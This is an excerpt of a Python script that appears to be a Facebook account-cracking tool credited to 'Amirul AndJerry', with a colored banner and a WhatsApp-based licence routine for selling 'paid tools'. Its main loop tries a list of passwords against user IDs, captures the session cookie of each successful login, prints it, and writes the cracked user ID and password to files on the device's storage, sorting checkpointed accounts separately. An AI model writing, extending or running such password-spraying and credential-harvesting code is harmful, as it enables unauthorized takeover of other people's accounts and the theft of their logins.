...
\x1b[1;97m[+]==============================================[+]
\x1b[1;91m[+] CREATED BY   :  🙂🙂🙂💙🤫
\x1b[1;92m[+] ON FACEBOK   : Amirul AndJerry
\x1b[1;93m[+] ON GITHUB    :  𝐀𝐦𝐢𝐫𝐮𝐥𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲
...
def action():
    ...
    if shuvo == '':
        ...
        os.system('clear')
        os.system('xdg-open https:oafridi')
        print (logo)
        print('[1]Facebook \n [2] Whatapp')
        mahd = input('Chouse :')
        if mahd =='1':
            os.system("xdg-open https://www.facebook.com/mdamirulislamh?mibextid=9R9pXO")
            snigdho()
        elif mahd == '2':
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[𝐀𝐦𝐢𝐫𝐮𝐥—*𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲-OK] \033[0;97m'+uid+'\033[1;32m | \033[0;93m' +ps+    '  \n[]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                cek_apk(session,coki)
                sn4gdh9('/sdcard/𝐀𝐦𝐢𝐫𝐮𝐥... 𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[𝐀𝐦𝐢𝐫𝐮𝐥-❌𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                sn4gdh9('/sdcard/𝐀𝐦𝐢𝐫𝐮𝐥 𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}𝐀𝐦𝐢𝐫𝐮𝐥 𝐀𝐧𝐝𝐉𝐞𝐫𝐫𝐲{x}][%s|%s][OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
...
def reg():
    ...
    if to in r:
        ...
        os.system('am start https://wa.me/?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20snigdho%20Paid%20Tools.%20My%20Key:%20'+id+snigdho)
        reg()
...
def reg2():
    ...
    os.system('am start https://wa.me/?text=Assalamowalikom%20Sir,%20I%20Want%20To%20Buy%20Your%20snigdho=MEX%20Paid%20Tools.%20My%20Key:%20'+id+snigdho)
